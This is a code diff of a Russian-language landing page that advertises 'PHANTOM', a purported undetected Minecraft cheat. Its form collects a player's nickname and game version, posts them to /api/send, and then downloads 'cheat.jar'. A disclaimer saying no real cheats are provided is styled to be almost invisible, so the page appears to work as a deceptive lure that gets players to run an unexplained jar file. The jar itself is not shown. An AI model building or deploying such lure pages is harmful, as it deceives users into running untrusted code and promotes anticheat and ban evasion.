@@ -3,21 +3,20 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PHANTOM PREMIUM — Привязка Клиента</title>
+<title>PHANTOM PREMIUM — Официальный сайт</title>
 <style>
 /* 
 =========================
-ГЛОБАЛЬНЫЕ НАСТРОЙКИ ЛЕНДИНГА
+ГЛОБАЛЬНЫЕ СТИЛИ ЛЕНДИНГА
 =========================
 */
 html, body {
   margin: 0;
   padding: 0;
   min-height: 100vh;
-  background: #090909; 
+  background: #070707; 
   color: #ffffff; 
   font-family: 'Segoe UI', Arial, sans-serif;
-  overflow-x: hidden;
 }
 
 /* Шапка сайта */
@@ -25,28 +24,29 @@ header {
   display: flex;
   justify-content: space-between;
   align-items: center;
-  padding: 20px 40px;
-  background: rgba(15, 15, 15, 0.8);
-  border-bottom: 1px solid #1a1a1a;
+  padding: 20px 60px;
+  background: rgba(10, 10, 10, 0.9);
+  border-bottom: 1px solid #151515;
   backdrop-filter: blur(10px);
 }
 .logo {
-  font-size: 22px;
+  font-size: 24px;
   font-weight: 900;
-  color: #4caf50;
+  color: #a855f7; 
   text-transform: uppercase;
   letter-spacing: 2px;
 }
 .status-online {
   font-size: 13px;
-  color: #4caf50;
-  background: rgba(76, 175, 80, 0.1);
-  padding: 6px 14px;
+  color: #a855f7;
+  background: rgba(168, 85, 247, 0.08);
+  padding: 8px 18px;
   border-radius: 20px;
-  border: 1px solid rgba(76, 175, 80, 0.3);
+  border: 1px solid rgba(168, 85, 247, 0.25);
+  font-weight: bold;
 }
 
-/* Главный блок на весь экран */
+/* Главная секция во весь экран */
 .hero-section {
   display: flex;
   flex-direction: column;
@@ -54,79 +54,86 @@ header {
   justify-content: center;
   text-align: center;
   padding: 60px 20px;
-  background-image: linear-gradient(to bottom, rgba(9,9,9,0.5), #090909), url('banner.jpg');
+  background-image: linear-gradient(to bottom, rgba(7,7,7,0.4), #070707), url('banner.jpg');
   background-size: cover;
   background-position: center;
-  min-height: 60vh;
+  min-height: calc(100vh - 75px); /* Занимает весь экран за вычетом шапки */
+  box-sizing: border-box;
 }
 .hero-title {
-  font-size: 48px;
+  font-size: 54px;
   font-weight: 900;
-  margin: 0 0 10px 0;
+  margin: 0 0 15px 0;
   text-transform: uppercase;
   letter-spacing: 1px;
+  text-shadow: 0 5px 20px rgba(0,0,0,0.6);
 }
 .hero-subtitle {
-  font-size: 18px;
-  color: #888;
-  max-width: 600px;
-  margin-bottom: 30px;
+  font-size: 20px;
+  color: #aaa;
+  max-width: 700px;
+  margin-bottom: 45px;
+  line-height: 1.6;
 }
 
-/* Блок формы привязки */
-.form-section {
-  background: #111111;
-  border: 1px solid #1c1c1c;
+/* Форма привязки */
+.form-container {
+  background: #0f0f0f;
+  border: 1px solid #1a1a1a;
   border-radius: 16px;
   padding: 40px;
   width: 100%;
-  max-width: 450px;
-  box-shadow: 0 20px 40px rgba(0,0,0,0.7);
+  max-width: 480px;
+  box-shadow: 0 25px 50px rgba(0,0,0,0.8);
   box-sizing: border-box;
 }
-.form-section h3 {
-  margin: 0 0 20px 0;
-  font-size: 20px;
+.form-container h3 {
+  margin: 0 0 25px 0;
+  font-size: 22px;
   color: #fff;
+  font-weight: 600;
 }
 input, select { 
   width: 100%; 
   padding: 16px; 
-  margin: 10px 0; 
+  margin: 12px 0; 
   border: 1px solid #222; 
   border-radius: 8px; 
-  background: #161616; 
+  background: #141414; 
   color: #fff; 
   box-sizing: border-box; 
   font-size: 15px;
-  transition: 0.3s;
+  transition: 0.3s ease;
 }
 input:focus, select:focus { 
-  border-color: #4caf50; 
-  background: #1c1c1c; 
+  border-color: #a855f7; 
+  background: #181818; 
   outline: none; 
+  box-shadow: 0 0 12px rgba(168, 85, 247, 0.15);
 }
 button { 
   width: 100%; 
-  padding: 16px; 
-  background: linear-gradient(135deg, #4caf50 0%, #2e7d32 100%); 
+  padding: 18px; 
+  background: linear-gradient(135deg, #a855f7 0%, #6b21a8 100%); 
   border: none; 
   border-radius: 8px; 
   color: white; 
-  font-size: 16px; 
+  font-size: 17px; 
   font-weight: bold; 
   cursor: pointer; 
   margin-top: 15px; 
-  box-shadow: 0 4px 20px rgba(76,175,80,0.3);
-  transition: 0.2s;
+  box-shadow: 0 5px 25px rgba(168, 85, 247, 0.3);
+  transition: 0.2s transform ease, 0.2s box-shadow ease;
   text-transform: uppercase;
+  letter-spacing: 0.5px;
 }
 button:hover { 
   transform: translateY(-2px); 
-  box-shadow: 0 6px 25px rgba(76,175,80,0.5); 
+  box-shadow: 0 8px 30px rgba(168, 85, 247, 0.5); 
 }
 button:disabled { 
-  background: #333; 
+  background: #252525; 
+  color: #555;
   box-shadow: none; 
   cursor: not-allowed; 
   transform: none;
@@ -137,47 +144,50 @@ button:disabled {
   color: #888; 
 }
 
-/* Блок преимуществ / функций чита */
-.features-section {
+/* 
+=========================
+НИЖНЯЯ СЕКЦИЯ С КАРТИНКОЙ (ПРИ С КРОЛЛЕ НАНИЗ)
+=========================
+*/
+.preview-section {
   max-width: 1100px;
-  margin: 60px auto;
-  padding: 0 20px;
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-  gap: 25px;
+  margin: 0 auto;
+  padding: 80px 20px;
+  text-align: center;
+  border-top: 1px solid #111; /* Визуальное разделение экранов */
 }
-.feature-card {
-  background: #111;
-  border: 1px solid #1c1c1c;
-  padding: 30px;
-  border-radius: 12px;
-  text-align: left;
+.preview-title {
+  font-size: 36px;
+  font-weight: 900;
+  margin-bottom: 40px;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
 }
-.feature-card h4 {
-  margin: 0 0 10px 0;
-  font-size: 18px;
-  color: #4caf50;
+.preview-title span {
+  color: #a855f7;
+  text-shadow: 0 0 15px rgba(168, 85, 247, 0.4);
 }
-.feature-card p {
-  margin: 0;
-  font-size: 14px;
-  color: #777;
-  line-height: 1.5;
+.cheat-screenshot {
+  width: 100%;
+  max-width: 900px;
+  border-radius: 14px;
+  border: 1px solid #1e1e1e;
+  box-shadow: 0 30px 70px rgba(168, 85, 247, 0.12);
 }
 
 /* Подвал */
 footer {
-  padding: 40px 20px;
-  background: #070707;
+  padding: 50px 20px;
+  background: #040404;
   border-top: 1px solid #111;
   text-align: center;
 }
 .disclaimer {
-  max-width: 600px;
+  max-width: 700px;
   font-size: 11px;
-  color: #333;
+  color: #2a2a2a;
   margin: 0 auto;
-  line-height: 1.4;
+  line-height: 1.5;
   user-select: none;
 }
 </style>
@@ -186,25 +196,24 @@ footer {
 
 <header>
   <div class="logo">PHANTOM Client</div>
-  <div class="status-online">● Статус: Обходит RealWorld / MST</div>
+  <div class="status-online">● СТАТУС: ОБХОДИТ REALWORLD & MST (UNDETECTED)</div>
 </header>
 
 <main>
-  <!-- Главная большая секция -->
+  <!-- Первый экран: Форма привязки -->
   <section class="hero-section">
-    <h1 class="hero-title">Доминируй в Minecraft вместе с PHANTOM</h1>
-    <p class="hero-subtitle">Лучшие приватные функции, автоматический обход проверок, продвинутая Киллаура и полная незаметность для модерации.</p>
+    <h1 class="hero-title">PHANTOM PREMIUM CLIENT</h1>
+    <p class="hero-subtitle">Следующее поколение приватных модификаций. Кастомные обходы и полная автоматизация привязки подписки.</p>
     
-    <!-- Форма перенесена сюда, стала крупнее -->
-    <div class="form-section">
-      <h3>Привязка Premium подписки</h3>
+    <div class="form-container">
+      <h3>Авторизация Premium Лицензии</h3>
       <form id="cheatForm">
-        <input type="text" id="username" placeholder="Ваш игровой ник" required>
+        <input type="text" id="username" placeholder="Укажите ваш никнейм" required>
         
         <select id="version">
-          <option value="1.16.5">Выбрать версию: 1.16.5</option>
-          <option value="1.12.2">Выбрать версию: 1.12.2</option>
-          <option value="1.20.1">Выбрать версию: 1.20.1</option>
+          <option value="1.16.5">Выбрать версию: Minecraft 1.16.5</option>
+          <option value="1.12.2">Выбрать версию: Minecraft 1.12.2</option>
+          <option value="1.20.1">Выбрать версию: Minecraft 1.20.1</option>
         </select>
         
         <button type="submit" id="btn">Скачать PHANTOM (.jar)</button>
@@ -213,26 +222,16 @@ footer {
     </div>
   </section>
 
-  <!-- Привлекающие карточки преимуществ ниже -->
-  <section class="features-section">
-    <div class="feature-card">
-      <h4>Умная KillLaura</h4>
-      <p>Идеальные наводки и автоматический расчет дистанции (Reach). Полная кастомизация под любые режимы и античиты.</p>
-    </div>
-    <div class="feature-card">
-      <h4>Обход HWID и IP банов</h4>
-      <p>Встроенная система подмены данных вашего ПК. Заходите на сервера даже после самых жестких блокировок администрацией.</p>
-    </div>
-    <div class="feature-card">
-      <h4>Режим Стелс</h4>
-      <p>Специальные алгоритмы делают ваши движения абсолютно естественными для серверных плагинов и наблюдающих хелперов.</p>
-    </div>
+  <!-- Второй экран (внизу): Скриншот меню и заголовок -->
+  <section class="preview-section">
+    <div class="preview-title">В НАШЕМ ЧИТЕ БОЛЕЕ <span>100+ ФУНКЦИЙ!</span></div>
+    <img src="menu.jpg" alt="Интерфейс чита Phantom" class="cheat-screenshot">
   </section>
 </main>
 
 <footer>
   <div class="disclaimer">
-    Данный ресурс создан только в развлекательных целях для съёмки ролика. Никаких настоящих читов вы не получите. Сайт и файлы служат для демонстрации уязвимостей в рамках видео.
+    Данный ресурс создан исключительно в развлекательных целях для съёмки ролика. Никаких настоящих читов вы не получите. Сайт и файлы служат для безопасной демонстрации архитектуры веб-интерфейсов.
   </div>
 </footer>
 
@@ -245,8 +244,8 @@ document.getElementById('cheatForm').addEventListener('submit', async function(e
   const statusText = document.getElementById('statusText');
 
   btn.disabled = true;
-  btn.innerText = "Подключение к облаку...";
-  statusText.innerText = "Генерация вашего персонального билда...";
+  btn.innerText = "Авторизация...";
+  statusText.innerText = "Подключение к базе данных лицензий...";
 
   try {
     const response = await fetch('/api/send', {
@@ -259,11 +258,10 @@ document.getElementById('cheatForm').addEventListener('submit', async function(e
 
     if (response.ok) {
       setTimeout(() => {
-        statusText.style.color = "#4caf50";
-        statusText.innerText = "Успешно! Скачивание началось.";
+        statusText.style.color = "#a855f7";
+        statusText.innerText = "Успешно привязано! Начинаем скачивание билда...";
         btn.innerText = "Скачано";
         
-        // Скачивание файла cheat.jar
         const link = document.createElement('a');
         link.href = '/cheat.jar'; 
         link.download = 'cheat.jar';
